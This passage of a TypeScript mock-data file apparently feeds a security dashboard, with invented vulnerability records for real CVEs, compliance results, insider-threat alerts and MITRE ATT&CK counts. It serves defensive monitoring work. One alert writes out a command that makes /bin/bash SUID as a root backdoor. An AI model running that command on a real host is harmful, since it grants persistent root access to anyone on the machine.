  { id: 'VUL-002', cve: 'CVE-2024-6387', title: 'regreSSHion — OpenSSH RCE', cvss: 8.1, severity: 'critical', affectedProduct: 'OpenSSH < 9.8p1', affectedHosts: ['bastion-01', 'db-server-02', 'app-server-03'], status: 'open', exploitAvailable: true, published: subDays(now, 120), patchAvailable: true, description: 'Race condition in OpenSSH signal handler allows unauthenticated remote code execution as root.' },
  { id: 'VUL-003', cve: 'CVE-2024-1709', title: 'ConnectWise ScreenConnect Auth Bypass', cvss: 10.0, severity: 'critical', affectedProduct: 'ScreenConnect < 23.9.8', affectedHosts: ['dc-01'], status: 'mitigated', exploitAvailable: true, published: subDays(now, 200), patchAvailable: true, description: 'Authentication bypass vulnerability allowing unauthenticated attackers to create admin accounts.' },
  { id: 'VUL-004', cve: 'CVE-2023-20198', title: 'Cisco IOS XE Web UI Privilege Escalation', cvss: 10.0, severity: 'critical', affectedProduct: 'Cisco IOS XE', affectedHosts: ['fw-edge-01'], status: 'open', exploitAvailable: true, published: subDays(now, 300), patchAvailable: true, description: 'Allows remote unauthenticated attacker to create admin-level account via web UI.' },
  { id: 'VUL-005', cve: 'CVE-2024-21887', title: 'Ivanti Connect Secure Command Injection', cvss: 9.1, severity: 'critical', affectedProduct: 'Ivanti Connect Secure / Policy Secure', affectedHosts: ['fw-edge-01'], status: 'accepted', exploitAvailable: true, published: subDays(now, 250), patchAvailable: true, description: 'Command injection vulnerability in web components allows remote code execution.' },
  { id: 'VUL-006', cve: 'CVE-2021-44228', title: 'Log4Shell — Apache Log4j RCE', cvss: 10.0, severity: 'critical', affectedProduct: 'Apache Log4j 2.x', affectedHosts: ['app-server-03', 'confluence-01'], status: 'patched', exploitAvailable: true, published: subDays(now, 1000), patchAvailable: true, description: 'JNDI injection vulnerability in Log4j allows remote code execution via crafted log messages.' },
  { id: 'VUL-007', cve: 'CVE-2023-44487', title: 'HTTP/2 Rapid Reset DDoS', cvss: 7.5, severity: 'high', affectedProduct: 'HTTP/2 implementations', affectedHosts: ['web-prod-01', 'web-prod-02', 'api-gateway-01'], status: 'mitigated', exploitAvailable: true, published: subDays(now, 400), patchAvailable: true, description: 'Protocol-level attack enabling DDoS by exploiting HTTP/2 stream reset mechanism.' },
  { id: 'VUL-008', cve: 'CVE-2024-27198', title: 'JetBrains TeamCity Authentication Bypass', cvss: 9.8, severity: 'critical', affectedProduct: 'TeamCity < 2023.11.4', affectedHosts: ['confluence-01'], status: 'open', exploitAvailable: true, published: subDays(now, 150), patchAvailable: true, description: 'Authentication bypass allows unauthenticated RCE via build agent API.' },
  { id: 'VUL-009', cve: 'CVE-2023-4966', title: 'Citrix Bleed — NetScaler Info Disclosure', cvss: 9.4, severity: 'critical', affectedProduct: 'Citrix NetScaler ADC/Gateway', affectedHosts: ['fw-edge-01'], status: 'patched', exploitAvailable: true, published: subDays(now, 350), patchAvailable: true, description: 'Memory disclosure vulnerability exposes session tokens allowing session hijacking.' },
  { id: 'VUL-010', cve: 'CVE-2024-21413', title: 'Microsoft Outlook NTLM Injection', cvss: 9.8, severity: 'critical', affectedProduct: 'Microsoft Outlook', affectedHosts: ['ws-finance-04', 'ws-exec-02', 'ws-hr-12'], status: 'open', exploitAvailable: false, published: subDays(now, 130), patchAvailable: true, description: 'MonikerLink bug allows NTLM credential theft via crafted email preview.' },
];

// ── Compliance ───────────────────────────────────────────────────────────────
export type CheckStatus = 'pass' | 'fail' | 'warning';
export type Framework = 'PCI-DSS' | 'CIS' | 'HIPAA' | 'NIST' | 'SOC2' | 'ISO27001';

export interface ComplianceCheck {
  id: string;
  framework: Framework;
  control: string;
  title: string;
  description: string;
  status: CheckStatus;
  affectedHosts: string[];
  remediation: string;
  lastChecked: Date;
}

export const complianceChecks: ComplianceCheck[] = [
  { id: 'CC-001', framework: 'PCI-DSS', control: '8.3.6', title: 'MFA for admin access', description: 'Multi-factor authentication must be implemented for all admin access', status: 'pass', affectedHosts: ['dc-01', 'admin-portal-01'], remediation: '', lastChecked: subHours(now, 2) },
  { id: 'CC-002', framework: 'PCI-DSS', control: '6.3.3', title: 'Security patches applied within 30 days', description: 'All system components must be protected from known vulnerabilities via patching', status: 'fail', affectedHosts: ['db-server-02', 'web-prod-01'], remediation: 'Apply CVE-2024-6387 patch immediately. Schedule maintenance window.', lastChecked: subHours(now, 2) },
  { id: 'CC-003', framework: 'PCI-DSS', control: '10.3.2', title: 'Audit log protection', description: 'Audit logs must be protected from destruction and unauthorized modifications', status: 'pass', affectedHosts: ['dc-01', 'siem-01'], remediation: '', lastChecked: subHours(now, 2) },
  { id: 'CC-004', framework: 'CIS', control: 'CIS-4.1', title: 'Maintain inventory of enterprise assets', description: 'Active asset inventory maintained and updated', status: 'pass', affectedHosts: [], remediation: '', lastChecked: subHours(now, 1) },
  { id: 'CC-005', framework: 'CIS', control: 'CIS-5.3', title: 'Disable dormant accounts', description: 'Disable user accounts that have been inactive for 45+ days', status: 'warning', affectedHosts: ['dc-01'], remediation: 'Review and disable 12 accounts inactive > 45 days.', lastChecked: subHours(now, 1) },
  { id: 'CC-006', framework: 'CIS', control: 'CIS-11.3', title: 'Use automated patch management', description: 'Automated patch management deployed to all endpoints', status: 'fail', affectedHosts: ['ws-legacy-01', 'ws-hr-12'], remediation: 'Enroll all endpoints in WSUS/SCCM automated patching.', lastChecked: subHours(now, 1) },
  { id: 'CC-007', framework: 'HIPAA', control: '164.312(a)(1)', title: 'Unique user identification', description: 'Unique name/number for each user to track identity', status: 'pass', affectedHosts: [], remediation: '', lastChecked: subHours(now, 3) },
  { id: 'CC-008', framework: 'HIPAA', control: '164.312(b)', title: 'Audit controls', description: 'Hardware, software, and procedural mechanisms to record access to ePHI', status: 'warning', affectedHosts: ['db-server-02'], remediation: 'Enable database audit logging for PHI tables.', lastChecked: subHours(now, 3) },
  { id: 'CC-009', framework: 'HIPAA', control: '164.312(e)(2)(ii)', title: 'Encryption at rest', description: 'Mechanism to encrypt ePHI at rest', status: 'fail', affectedHosts: ['fs-secure-01'], remediation: 'Enable BitLocker/LUKS on all PHI storage volumes.', lastChecked: subHours(now, 3) },
  { id: 'CC-010', framework: 'NIST', control: 'ID.AM-2', title: 'Software platforms inventoried', description: 'Software platforms and applications within the organization are inventoried', status: 'pass', affectedHosts: [], remediation: '', lastChecked: subHours(now, 4) },
  { id: 'CC-011', framework: 'NIST', control: 'PR.AC-4', title: 'Least privilege enforced', description: 'Access permissions are managed incorporating the principles of least privilege', status: 'warning', affectedHosts: ['dc-01', 'db-server-02'], remediation: 'Review overprivileged service accounts and apply least-privilege policy.', lastChecked: subHours(now, 4) },
  { id: 'CC-012', framework: 'NIST', control: 'DE.CM-1', title: 'Network monitoring for attacks', description: 'The network is monitored to detect potential cybersecurity events', status: 'pass', affectedHosts: ['ids-sensor-01'], remediation: '', lastChecked: subHours(now, 4) },
  { id: 'CC-013', framework: 'SOC2', control: 'CC6.1', title: 'Logical access controls', description: 'Logical access security measures to protect against threats', status: 'pass', affectedHosts: [], remediation: '', lastChecked: subHours(now, 5) },
  { id: 'CC-014', framework: 'SOC2', control: 'CC7.2', title: 'Security event monitoring', description: 'System components monitored for anomalies indicative of malicious acts', status: 'pass', affectedHosts: [], remediation: '', lastChecked: subHours(now, 5) },
  { id: 'CC-015', framework: 'SOC2', control: 'CC8.1', title: 'Change management procedures', description: 'Changes to infrastructure, data and software authorized, documented, tested', status: 'warning', affectedHosts: ['fw-edge-01'], remediation: 'Enforce CAB review for all firewall rule changes.', lastChecked: subHours(now, 5) },
  { id: 'CC-016', framework: 'ISO27001', control: 'A.9.4.2', title: 'Secure log-on procedures', description: 'Access to systems controlled by a secure log-on procedure', status: 'pass', affectedHosts: [], remediation: '', lastChecked: subHours(now, 6) },
  { id: 'CC-017', framework: 'ISO27001', control: 'A.12.4.1', title: 'Event logging', description: 'Event logs recording user activities, exceptions, faults and security events', status: 'pass', affectedHosts: [], remediation: '', lastChecked: subHours(now, 6) },
  { id: 'CC-018', framework: 'ISO27001', control: 'A.18.1.3', title: 'Protection of records', description: 'Records protected from loss, destruction, falsification, unauthorized access', status: 'fail', affectedHosts: ['fs-server-01'], remediation: 'Implement immutable backup solution (WORM storage).', lastChecked: subHours(now, 6) },
  { id: 'CC-019', framework: 'ISO27001', control: 'A.14.2.2', title: 'System change control procedures', description: 'Changes to systems controlled by formal change control procedures', status: 'warning', affectedHosts: ['app-server-03'], remediation: 'Enforce IaC review and signed deployment approvals.', lastChecked: subHours(now, 6) },
];

// ── UBA Events ───────────────────────────────────────────────────────────────
export type UBAType = 'impossible_travel' | 'unusual_login_time' | 'excessive_data_access' | 'privilege_escalation' | 'after_hours' | 'lateral_movement' | 'data_staging';
export type UBAStatus = 'open' | 'investigating' | 'resolved' | 'false_positive';

export interface UBAEvent {
  id: string;
  timestamp: Date;
  username: string;
  type: UBAType;
  riskScore: number;
  description: string;
  details: string;
  status: UBAStatus;
  affectedHost: string;
  department: string;
}

export const ubaEvents: UBAEvent[] = [
  { id: 'UBA-001', timestamp: subMinutes(now, 22), username: 'jdoe', type: 'impossible_travel', riskScore: 97, description: 'Impossible travel: New York → Moscow in 8 minutes', details: 'Login from 72.14.207.33 (New York, US) at 14:02, then 203.0.113.42 (Moscow, RU) at 14:10. Physical travel impossible.', status: 'investigating', affectedHost: 'idp-01', department: 'Engineering' },
  { id: 'UBA-002', timestamp: subHours(now, 1), username: 'tgarcia', type: 'privilege_escalation', riskScore: 91, description: 'Privilege escalation via Mimikatz LSASS dump', details: 'User tgarcia (standard HR employee) executed Mimikatz. LSASS memory accessed. 47 credential hashes extracted.', status: 'investigating', affectedHost: 'ws-hr-12', department: 'HR' },
  { id: 'UBA-003', timestamp: subHours(now, 2), username: 'contractor_01', type: 'data_staging', riskScore: 88, description: 'Large dataset staged for exfiltration — 4.2 GB', details: 'contractor_01 accessed 1,847 files across 12 sensitive directories in 20 min. Data staged in /tmp before upload.', status: 'open', affectedHost: 'ws-dev-09', department: 'Contract' },
  { id: 'UBA-004', timestamp: subHours(now, 3), username: 'ex_employee', type: 'excessive_data_access', riskScore: 95, description: 'Terminated employee account accessing source repos', details: 'Account active 14 days after termination. Cloned 3 proprietary repositories totaling 2.1 GB to personal device.', status: 'open', affectedHost: 'ws-dev-15', department: 'Engineering' },
  { id: 'UBA-005', timestamp: subHours(now, 4), username: 'analytics_svc', type: 'after_hours', riskScore: 62, description: 'Service account login at 02:47 AM — outside maintenance window', details: 'analytics_svc accessed customer database at 02:47 AM. No scheduled job running. 100k rows queried.', status: 'open', affectedHost: 'db-analytics-01', department: 'Data' },
  { id: 'UBA-006', timestamp: subHours(now, 6), username: 'mwilliams', type: 'lateral_movement', riskScore: 79, description: 'Lateral movement — accessing 23 hosts via SMB', details: 'mwilliams authenticated to 23 internal hosts in 45 minutes via SMB. Possible PsExec or wmiexec usage.', status: 'investigating', affectedHost: 'ws-ops-07', department: 'Operations' },
  { id: 'UBA-007', timestamp: subHours(now, 8), username: 'intern_02', type: 'unusual_login_time', riskScore: 54, description: 'Login from unrecognized country — Brazil', details: 'intern_02 typically logs in from San Francisco. Login from São Paulo, BR at 11:30 PM local time. No travel notification.', status: 'open', affectedHost: 'fs-secure-01', department: 'Finance' },
  { id: 'UBA-008', timestamp: subHours(now, 12), username: 'devops01', type: 'privilege_escalation', riskScore: 83, description: 'Sudo abuse — chmod 4777 on /bin/bash', details: 'devops01 executed: sudo bash -c "chmod 4777 /bin/bash" — creates SUID backdoor for persistent root access.', status: 'resolved', affectedHost: 'linux-dev-04', department: 'DevOps' },
];

// ── MITRE ATT&CK ─────────────────────────────────────────────────────────────
export interface MitreTactic {
  id: string;
  name: string;
  techniques: { id: string; name: string; hits: number }[];
}

export const mitreTactics: MitreTactic[] = [
  { id: 'TA0001', name: 'Initial Access', techniques: [{ id: 'T1190', name: 'Exploit Public-Facing App', hits: 12 }, { id: 'T1078', name: 'Valid Accounts', hits: 8 }, { id: 'T1133', name: 'External Remote Services', hits: 4 }, { id: 'T1566', name: 'Phishing', hits: 6 }] },
  { id: 'TA0002', name: 'Execution', techniques: [{ id: 'T1059.001', name: 'PowerShell', hits: 9 }, { id: 'T1059.003', name: 'Windows Command Shell', hits: 5 }, { id: 'T1203', name: 'Exploit for Client Execution', hits: 3 }] },
  { id: 'TA0003', name: 'Persistence', techniques: [{ id: 'T1547.001', name: 'Registry Run Keys', hits: 4 }, { id: 'T1053.005', name: 'Scheduled Task', hits: 7 }, { id: 'T1098', name: 'Account Manipulation', hits: 2 }] },
  { id: 'TA0004', name: 'Privilege Escalation', techniques: [{ id: 'T1558.001', name: 'Golden Ticket', hits: 2 }, { id: 'T1068', name: 'Exploitation for Privilege Escalation', hits: 5 }, { id: 'T1548', name: 'Abuse Elevation Control Mechanism', hits: 3 }] },
  { id: 'TA0005', name: 'Defense Evasion', techniques: [{ id: 'T1562.001', name: 'Disable Security Tools', hits: 3 }, { id: 'T1027', name: 'Obfuscated Files', hits: 11 }, { id: 'T1036', name: 'Masquerading', hits: 6 }] },
  { id: 'TA0006', name: 'Credential Access', techniques: [{ id: 'T1003.001', name: 'LSASS Memory', hits: 4 }, { id: 'T1110.001', name: 'Password Guessing', hits: 18 }, { id: 'T1552', name: 'Unsecured Credentials', hits: 5 }] },
  { id: 'TA0007', name: 'Discovery', techniques: [{ id: 'T1046', name: 'Network Service Scanning', hits: 15 }, { id: 'T1083', name: 'File and Directory Discovery', hits: 8 }, { id: 'T1087', name: 'Account Discovery', hits: 4 }] },
  { id: 'TA0008', name: 'Lateral Movement', techniques: [{ id: 'T1021.001', name: 'Remote Desktop Protocol', hits: 7 }, { id: 'T1021.002', name: 'SMB/Windows Admin Shares', hits: 9 }, { id: 'T1550', name: 'Use Alternate Auth Material', hits: 3 }] },
  { id: 'TA0009', name: 'Collection', techniques: [{ id: 'T1560', name: 'Archive Collected Data', hits: 5 }, { id: 'T1114', name: 'Email Collection', hits: 3 }, { id: 'T1005', name: 'Data from Local System', hits: 8 }] },
  { id: 'TA0010', name: 'Exfiltration', techniques: [{ id: 'T1048.003', name: 'Exfil over DNS', hits: 6 }, { id: 'T1537', name: 'Transfer to Cloud Account', hits: 3 }, { id: 'T1041', name: 'Exfil over C2 Channel', hits: 9 }] },
  { id: 'TA0011', name: 'Command & Control', techniques: [{ id: 'T1071.001', name: 'Web Protocols', hits: 14 }, { id: 'T1095', name: 'Non-App Layer Protocol', hits: 4 }, { id: 'T1572', name: 'Protocol Tunneling', hits: 7 }] },
  { id: 'TA0040', name: 'Impact', techniques: [{ id: 'T1486', name: 'Data Encrypted for Impact', hits: 5 }, { id: 'T1490', name: 'Inhibit System Recovery', hits: 2 }, { id: 'T1499', name: 'Endpoint DoS', hits: 3 }] },
];
